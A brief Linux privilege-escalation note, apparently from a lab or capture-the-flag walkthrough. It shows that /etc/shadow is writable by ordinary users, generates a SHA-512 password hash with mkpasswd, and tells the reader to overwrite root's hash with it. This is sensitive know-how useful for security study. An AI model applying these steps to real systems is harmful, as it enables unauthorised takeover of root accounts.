/etc/shadow can be written by regular user
```bash
ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```
can make your own password with
```bash
mkpasswd -m sha-512 newpasswordhere

```
then edit the /etc/shadow root user with your new password